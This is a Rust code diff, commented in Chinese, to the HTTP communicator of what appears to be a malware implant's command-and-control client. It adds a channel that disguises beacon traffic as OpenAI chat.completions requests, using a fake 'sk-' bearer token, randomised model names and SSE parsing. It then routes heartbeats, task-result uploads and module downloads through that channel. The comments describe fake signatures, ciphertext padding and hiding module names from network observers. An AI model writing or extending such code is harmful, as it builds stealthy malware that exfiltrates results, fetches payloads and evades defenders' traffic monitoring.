@@ -119,10 +119,8 @@ impl HttpCommunicator {
         Some(p.user_agents[idx % p.user_agents.len()].clone())
     }
 
-    /// 构造单入口请求：外层壳 + 密文 + 假签名 + 会话 token。
-    /// `inner_plain` 为密文内部的 JSON（信封），`key` 为加密密钥。
-    fn build_body(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
-        // 密文长度随机化：明文尾部追加随机空白（JSON 解析容忍）
+    /// 密文长度随机化：明文尾部追加随机空白（JSON 解析容忍），然后 AES-GCM 加密。
+    fn pad_and_encrypt(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
         let (pmin, pmax) = self
             .profile
             .as_ref()
@@ -134,7 +132,13 @@ impl HttpCommunicator {
             0
         };
         let padded = format!("{}{}", inner_plain, "\n".repeat(pad_len));
-        let cipher_b64 = libra_crypto::encrypt_payload(&padded, key);
+        libra_crypto::encrypt_payload(&padded, key)
+    }
+
+    /// 构造单入口请求：外层壳 + 密文 + 假签名 + 会话 token。
+    /// `inner_plain` 为密文内部的 JSON（信封），`key` 为加密密钥。
+    fn build_body(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
+        let cipher_b64 = self.pad_and_encrypt(inner_plain, key);
 
         let (dk, tk, rk, sk, sidk) = self
             .profile
@@ -211,6 +215,84 @@ impl HttpCommunicator {
             .and_then(|p| p.as_str())
             .ok_or("missing payload in response")?;
         libra_crypto::decrypt_payload(payload, key)
+    }
+
+    // ── AI 通道（v1/chat/completions + SSE）─────────────────────────
+
+    /// 通过 AI 通道发送信封并等待 SSE 响应，返回解密后的响应明文。
+    ///
+    /// 请求伪装为 chat.completions 调用：
+    ///   POST /v1/chat/completions
+    ///   Authorization: Bearer sk-<随机>
+    ///   {"model":"<真实模型名>","stream":true,"messages":[{"role":"user","content":"<密文>"}]}
+    /// 响应为 SSE 流：data: {choices:[{delta:{content:"<密文分块>"}}]} ... data: [DONE]
+    async fn post_ai(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> Result<String, String> {
+        let (ai_path, models, auth_prefix) = self
+            .profile
+            .as_ref()
+            .map(|p| (p.ai_path.as_str(), p.ai_models.as_slice(), p.auth_prefix.as_str()))
+            .unwrap_or(("/v1/chat/completions", &[][..], "sk-"));
+
+        let cipher_b64 = self.pad_and_encrypt(inner_plain, key);
+        let model = if models.is_empty() {
+            "gpt-4o-mini"
+        } else {
+            models[rand::thread_rng().gen_range(0..models.len())].as_str()
+        };
+        let body = serde_json::json!({
+            "model": model,
+            "stream": true,
+            "messages": [{"role": "user", "content": cipher_b64}]
+        });
+
+        let auth: String = {
+            let mut b = [0u8; 24];
+            rand::thread_rng().fill(&mut b);
+            format!("Bearer {}{}", auth_prefix, b.iter().map(|x| format!("{x:02x}")).collect::<String>())
+        };
+
+        let url = format!("{}{}", self.server_url, ai_path);
+        let mut req = self
+            .client
+            .post(&url)
+            .header("Content-Type", "application/json")
+            .header("Authorization", auth)
+            .body(body.to_string());
+        if let Some(ua) = self.pick_user_agent() {
+            req = req.header(reqwest::header::USER_AGENT, ua);
+        }
+
+        let resp = req.send().await.map_err(|e| e.to_string())?;
+        let status = resp.status().as_u16();
+        let text = resp.text().await.map_err(|e| e.to_string())?;
+        if status == 401 {
+            return Err("SESSION_LOST".to_string());
+        }
+        if status != 200 {
+            return Err(format!("AI channel request failed: {status}"));
+        }
+
+        // SSE 解析：聚合 data: 行中的 delta.content（base64 密文分块），[DONE] 结束
+        let mut cipher = String::new();
+        for line in text.lines() {
+            let line = line.trim();
+            let data = match line.strip_prefix("data:") {
+                Some(d) => d.trim(),
+                None => continue,
+            };
+            if data == "[DONE]" {
+                break;
+            }
+            if let Ok(v) = serde_json::from_str::<Value>(data) {
+                if let Some(content) = v["choices"][0]["delta"]["content"].as_str() {
+                    cipher.push_str(content);
+                }
+            }
+        }
+        if cipher.is_empty() {
+            return Err("empty AI channel response".to_string());
+        }
+        libra_crypto::decrypt_payload(&cipher, key)
     }
 
     /// 注册：op=reg，预会话密钥加密（无会话密钥时的 bootstrap）。
@@ -325,7 +407,7 @@ impl HttpCommunicator {
         })
     }
 
-    /// 心跳：op=hb。响应为壳包裹的密文，内含 pendingTask。
+    /// 心跳：op=hb，走 AI 通道。响应 SSE 内含 pendingTask。
     pub async fn heartbeat(
         &self,
         _agent_id: &str,
@@ -340,17 +422,8 @@ impl HttpCommunicator {
             .as_millis() as i64;
         let inner = serde_json::json!({ "op": "hb", "id": token, "data": format!(r#"{{"ts":{}}}"#, ts) })
             .to_string();
-        let body = self.build_body(&inner, key);
 
-        let (status, resp_body) = self.post_envelope(body).await?;
-        if status == 401 {
-            return Err("SESSION_LOST".to_string());
-        }
-        if status != 200 {
-            return Err(format!("Heartbeat failed: {status}"));
-        }
-
-        let plain = self.decrypt_response(&resp_body, key)?;
+        let plain = self.post_ai(&inner, key).await?;
         let v: Value = serde_json::from_str(&plain)
             .map_err(|e| format!("bad heartbeat payload: {e}"))?;
 
@@ -364,7 +437,7 @@ impl HttpCommunicator {
         }
     }
 
-    /// 提交任务结果：op=res。
+    /// 提交任务结果：op=res，走 AI 通道。
     pub async fn submit_result(
         &self,
         _agent_id: &str,
@@ -375,18 +448,11 @@ impl HttpCommunicator {
         let token = self.session_token.clone().unwrap_or_default();
 
         let inner = serde_json::json!({ "op": "res", "id": token, "data": result_json }).to_string();
-        let body = self.build_body(&inner, key);
-        let (status, _) = self.post_envelope(body).await?;
-        if status == 401 {
-            return Err("SESSION_LOST".to_string());
-        }
-        if status != 200 {
-            return Err(format!("Result submit failed: {status}"));
-        }
+        self.post_ai(&inner, key).await?;
         Ok(())
     }
 
-    /// 模块下载：op=mod（模块名在密文内，线路上不可见）。
+    /// 模块下载：op=mod，走 AI 通道（模块名在密文内，线路上不可见）。
     pub async fn download_module(
         &self,
         name: &str,
@@ -396,18 +462,9 @@ impl HttpCommunicator {
         let token = self.session_token.clone().unwrap_or_default();
         let inner = serde_json::json!({ "op": "mod", "id": token, "data": format!(r#"{{"name":"{}"}}"#, escape(name)) })
             .to_string();
-        let body = self.build_body(&inner, session_key);
 
-        let (status, resp_body) = self.post_envelope(body).await?;
-        if status == 401 {
-            return Err("SESSION_LOST".to_string());
-        }
-        if status != 200 {
-            return Err(format!("module download failed: {status}"));
-        }
-
-        // 模块响应：密文内容是 base64 的模块二进制（libra_crypto::encrypt_bytes 布局）
-        let plain = self.decrypt_response(&resp_body, session_key)?;
+        // 响应密文内容是 base64 的模块二进制
+        let plain = self.post_ai(&inner, session_key).await?;
         use base64::Engine as _;
         base64::engine::general_purpose::STANDARD
             .decode(plain.trim())
